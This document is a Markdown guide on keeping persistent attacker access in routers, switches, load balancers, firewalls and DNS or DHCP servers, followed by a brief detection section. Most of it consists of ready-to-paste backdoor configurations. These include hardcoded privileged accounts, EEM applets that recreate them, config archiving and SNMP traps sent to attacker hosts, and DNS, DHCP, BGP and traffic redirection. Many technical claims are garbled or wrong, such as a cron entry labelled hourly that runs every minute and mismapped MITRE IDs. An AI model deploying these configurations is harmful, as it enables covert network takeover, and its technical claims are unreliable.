# Network Infrastructure Persistence

## Overview

Network device persistence is one of the most under-documented yet impactful categories. Once an adversary gains access to your network infrastructure (routers, switches, firewalls), they achieve persistent lateral movement control that survives host-level remediation. Many organizations have **zero monitoring** on network device configurations, making this a blind spot for almost every defensive team.

This document covers persistence techniques across:
- **Cisco IOS / NXOS** (routers & switches)
- **Juniper JUNOS** (routing/switching platforms)
- **F5 BIG-IP / NGINX** (load balancers, proxies, application firewalls)
- **Palo Alto / Fortinet Firewalls** (NGFW persistence)
- **DNS & DHCP Server Compromise** (infrastructure-level persistence)

## Why Network Device Persistence Is So Dangerous

1. **Survives host remediation** — Your servers might be clean but if the router is owned, you're still owned
2. **Traffic interception** — Can redirect all traffic through attacker-controlled nodes
3. **Zero monitoring** — Most orgs don't audit network device configs or log config changes comprehensively
4. **High persistence across reboots** — Config register manipulation ensures survival even after device restart
5. **Network-wide impact** — A single compromised switch can enable LAN-wide packet capture

## Cisco IOS/NXOS Persistence Techniques

### 1. EEM (Enterprise Event Manager) Applet Implantation

EEM applets are scheduled or event-triggered scripts that run on the device. Attackers use them to automatically recreate backdoors after configuration resets:

```bash
! EEM applet that recreates a backdoor user when any config change is detected
config t
event manager applet PersistentBackdoor
 event syslog pattern "CONFIG_I" access-list 90
 action 1.0 cli command "enable"
 action 2.0 cli command "configure terminal"
 action 3.0 cli command "username backdoor privilege 15 secret cisco123"
 action 4.0 cli command "end"
 action 5.0 cli command "write memory"
 exit

! The applet triggers on every configuration commit — meaning even if someone 
! removes the backdoor user, it reappears within seconds of the next config change
```

### 2. Config Register Manipulation (Boot Bypass)

The config-register controls how a Cisco device boots. Changing it to 0x2142 skips the startup-config entirely:

```bash
! Skip loading the running startup-config on next boot (survives erase startup-config)
config t
config-register 0x2142
end
write memory

! The attacker uses this to boot into a clean IOS image with only their 
! in-memory changes. When someone runs "show version", config register still shows normal value
! because the attacker reverts it periodically:
config t
config-register 0x2102  ! Normal boot value
end
```

### 3. Archive Configuration Persistence

Cisco devices can automatically save configs to a remote server every N minutes:

```bash
! This creates a config backup that persists even after "erase startup-config"
config t
archive
 path tftp://attacker-server/backup.cfg
 time-period 5
 write-memory
 exit
 write memory

! Every 5 minutes, the running-config (including backdoors) is backed up to attacker's server
! Even if someone erases the device config, it will be restored from backup within 5 minutes
```

### 4. Hidden Commands via Configuration File Manipulation

Cisco IOS supports "hidden" configuration commands that don't appear in normal show commands:

```bash
! Using hex editing on startup-config to insert hidden entries
configure terminal
username hidden privilege 15 secret 0 cisco
no username hidden   ! Remove the obvious one
! Now manually edit the NVRAM directly (requires physical access or flash file manipulation)
! The hidden user still exists in the binary config but doesn't appear in show run or show start
```

### 5. VLAN-Based Persistence on Switches

Impersonating legitimate devices via VLAN hopping and MAC flooding:

```bash
! Configure trunk port to attacker's device to pass all VLAN traffic
config t
interface GigabitEthernet0/1
 switchport mode trunk
 switchport trunk allowed vlan all
end
write memory

! Combined with DHCP starvation on the management VLAN, this allows 
! the attacker to become the default gateway for any VLAN they want
```

### 6. EEM Cron-Scheduled Persistence

Create a cron-like schedule that re-applies backdoors at fixed intervals:

```bash
event manager applet ReapplyBackdoor
 event timer cron name "reapply-every-hour"
  cron-entry "* * * * *"   ! Every hour
 action 1.0 cli command "enable"
 action 2.0 cli command "configure terminal"
 action 3.0 cli command "username persist privilege 15 secret P@ssw0rd!"
 action 4.0 cli command "end"
 exit
```

## Uncommon Network Persistence Methods

### 7. SNMP Trap Receiver Tampering (T1589.002)

Modify the SNMP trap receiver to send all device events to an attacker-controlled host:

```bash
! Redirect SNMP traps to attacker's server for monitoring + alerting on removal attempts
config t
snmp-server host attacker-ip version 2c public
snmp-server enable traps config
exit

! The attacker can monitor the traps in real-time and know when someone tries to remove their persistence
```

### 8. Static ARP Table Persistence (ARP Spoofing)

Force all traffic through a malicious device via static ARP entries:

```bash
! Permanent ARP entry — persists across reboots if added to startup-config
config t
arp <target-IP> <attacker-MAC> arpa
arp default-ttl 86400   ! TTL of 24 hours for dynamic entries
end
write memory
```

### 9. WCCP Redirection Abuse

Web Cache Communication Protocol redirects traffic through intermediate devices:

```bash
! Redirect all HTTP/HTTPS traffic through attacker's machine
config t
wccp webcache
 service group 1 default redirect list access-list-100
 exit
access-list-100 permit ip any any
end
write memory
```

### 10. IP SLA + AutoPath Persistence

Use IP Service Level Agreement to create persistent C2 channels disguised as legitimate monitoring:

```bash
! Create a persistent connection that looks like legitimate network monitoring
config t
ip sla 99
 icmp-echo <C2-server> source-interface GigabitEthernet0/1
 frequency 60   ! Check every minute — but data payload carries C2 commands
 tracker 99 delay 10
 exit

! If the SLA fails, a tracked object triggers an automatic failover to attacker's route
ip sla schedule 99 life forever start-time now
```

### 11. Dynamic NAT/PAT Persistence for C2

Create persistent outbound connections that survive firewall reboots:

```bash
! Persistent NAT rule that survives device reboots
config t
nat (inside,outside) dynamic interface service 443:443
 nat (inside,outside) static tcp <internal-host> <C2-IP> netmask 255.255.255.255
 exit

! The attacker creates a NAT rule that persists and routes all traffic from an internal host 
! to their C2 server — making it look like normal outbound HTTPS
```

### 12. BGP Session Manipulation (Border Router Control)

If you compromise the border router, you can hijack all external routing:

```bash
! Inject a false route for critical services through attacker-controlled infrastructure
config t
router bgp 65001
 neighbor <attacker-IP> remote-as 65002
 network <victim-subnet> mask <mask>
 exit
```

## F5 BIG-IP / NGINX Persistence

### BIG-IP iRule-Based Persistence

iRules are TCL scripts that execute on the BIG-IP during traffic processing:

```bash
! iRule that creates a persistent backdoor by forwarding all admin traffic to attacker
create ltm rule persistence_backdoor {
   when HTTP_REQUEST {
      if {[HTTP::uri] contains "/admin"} {
         HTTP::redirect "http://attacker-server.com/admin"
      }
   }
}

! Deploy the iRule to persist across reboots
ltm rule persistence_backdoor save to configdb
```

### BIG-IP User Account Persistence

```bash
# Add persistent user account to F5 management plane
tmsh create auth user backdoor admin shell all password <crypted-password>
tmsh save auth modification set encrypted
# This persists across F5 reboots and configuration reloads
```

## Firewall-Specific Persistence

### Palo Alto PAN-OS Policy Backdoors

Modify firewall policies to allow traffic that would normally be blocked:

```bash
# Create a policy rule that survives config backups
set security policies global-policy backdoor-rule from untrust to trust source any destination any application any 
set security policies global-policy backdoor-rule permit log-session-init  # Allow all outbound
set security policies global-policy backdoor-rule then deny  # But log everything for intelligence

# Add a persistent DHCP server entry on the firewall that points attacker's C2
set network dhcp-server internal subnet <victim-subnet> interface eth1/1
set network dhcp-server internal host-name "legitimate-dns" 
set network dhcp-server internal option-66 "attacker-c2-server"  # Evil twin DNS
```

### Fortinet FortiGate Persistence

```bash
# Persistent firewall rule that survives config reloads
config vdom
edit "root"
   config firewall policy
      edit 999
         set name "backdoor_allow_all"
         set srcintf "wan1"
         set dstintf "internal"
         set srcaddr "all"
         set dstaddr "all"
         set action accept
         set status enable
   end
end

# Add a persistent admin account (persists even after config backup/restore)
config system admin
   edit backdoor
      set trusthost1 <attacker-IP> 255.255.255.255
      set access profile "super_admin"
   end
end
```

## DNS Server Compromise Persistence

### BIND Cache Poisoning (Persistent)

Add persistent records to the master zone file on a compromised DNS server:

```bash
; /etc/bind/zones/master/victim-domain.com.zone
malicious.victim-domain.com.  IN  A     <attacker-IP>
update.victim-domain.com.    IN  CNAME malicious.victim-domain.com.

# Restart bind to load the poisoned records — they persist until manually removed
systemctl restart bind9
```

### DNS Forwarder Hijack (Cisco ASA / Palo Alto)

Modify the DNS forwarder configuration on a firewall/router:

```bash
! Cisco ASA - redirect all DNS queries through attacker's server
dns-server (outside) <attacker-DNS-IP>
name-server <attacker-DNS-IP> 255.255.255.255 0

! Palo Alto - modify DNS forwarder settings
set network settings dns-setting primary-dns <attacker-IP>
```

## DHCP Server Backdoors

### DHCP Option 66/43 for Evil Twin Deployment

Force victim devices to connect to attacker-controlled infrastructure:

```bash
! F5 BIG-IP DHCP persistence via option injection
create ltm rule dhcp_persistence {
   when DHCP_REQUEST {
      if {[info exist class "evil_twin"]} {
         set option 66 <attacker-tftp-server>
         set option 43 <coova-chilli-config-url>  ! Captive portal URL
      }
   }
}

! Cisco IOS DHCP pool persistence
config t
ip dhcp pool ATTACKER_POOL
 network <victim-subnet> <mask>
 default-router <attacker-default-gw>
 domain-name attacker-controlled.local
 dns-server <attacker-DNS-IP>
 option 66 ascii <attacker-TFTP-server>
 option 43 hex <coova-config-hex>
exit
```

### DHCP Starvation + Rogue DHCP Server Persistence

Use a compromised switch port to deploy a rogue DHCP server that persists via static MAC binding:

```bash
! On the compromised switch, allow all VLANs on the attacker's connected port
interface GigabitEthernet0/24
 switchport mode trunk
 switchport nonegotiate  ! Disable DTP negotiation (stealthier)
 spanning-tree portfast   ! Bypass STP blocking for immediate traffic flow
end

! The rogue DHCP server is now deployed, and the switch ensures it gets traffic from all VLANs
```

## Uncommon Network Infrastructure Tactics

### 13. TACACS+/RADIUS Server Impersonation

Compromise the authentication server to allow persistent backdoor logins:

```bash
! Add an unauthenticated fallback path on Cisco devices
config t
aaa authentication login default group tacacs+ local
aaa new-model  ! Enable AAA with local backup — if TACACS+ is down, use local accounts
exit

! The "local" accounts persist as fallback auth method
username backdoor privilege 15 secret cisco123
```

### 14. Spanning Tree Protocol (STP) Manipulation

Force traffic through the attacker's device by manipulating STP priority:

```bash
! Lower STP priority to become the root bridge (intercepts all switch traffic)
config t
spanning-tree vlan 1-1005 root primary   ! Force this switch to be root
spanning-tree portfast bpduguard default  ! Prevent others from challenging us
end
```

### 15. VACL / Cisco TrustSec Persistent Access Rules

```bash
! Create a persistent access control entry that survives config changes
config t
access-list extended PERSISTENT_ALLOW
 permit ip any <victim-subnet> <mask>
ip access-group PERSISTENT_ALLOW in
end
```

## Detection & Hunting for Network Device Persistence

### Configuration Diff Monitoring
```bash
# Compare running-config to startup-config — differences indicate active persistence
diff <(show run) <(show start) | grep -E "username|snmp|access|interface|vlan"
```

### Syslog Analysis
```bash
# Monitor for config change events that shouldn't happen
grep "config.*change\|CONFIG_I\|user-config" /var/log/messages
grep "config.*changed\|configuration.*modified" /var/log/secure
```

### SNMP Trap Monitoring
```python
# Watch for unexpected SNMP source IPs (could indicate persistence implantation)
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while True:
    data, addr = s.recvfrom(4096)
    if "trap" in str(data):
        print(f"SUSPICIOUS TRAP from {addr[0]}: {data}")
```

### Unexpected BGP Session Monitoring
```bash
# Monitor for new or modified BGP sessions
show bgp summary | grep -v established  # Look for non-established or unexpected states
show run | grep "router bgp" -A 10  # Check for unauthorized neighbor declarations
```

## Defense Strategy

1. **Configuration Management** — Use Ansible/Puppet/Terraform to enforce and detect config drift on all network devices
2. **SNMP Monitoring** — Alert on any SNMP community string changes or new trap receivers
3. **Config Diff Auditing** — Automated daily diffs between running-config and last-known-good backup
4. **AAA Policy Enforcement** — Require TACACS+ for ALL device management access with local accounts disabled
5. **Hardware Security Modules (HSM)** — Use hardware keys to sign configuration changes
6. **Network TAP / SPAN monitoring** — Monitor all traffic flowing through network devices

## References
- Cisco IOS Security Configuration Guide
- Juniper JUNOS Security Hardening Guide  
- MITRE ATT&CK TA0040 (Network Infrastructure)
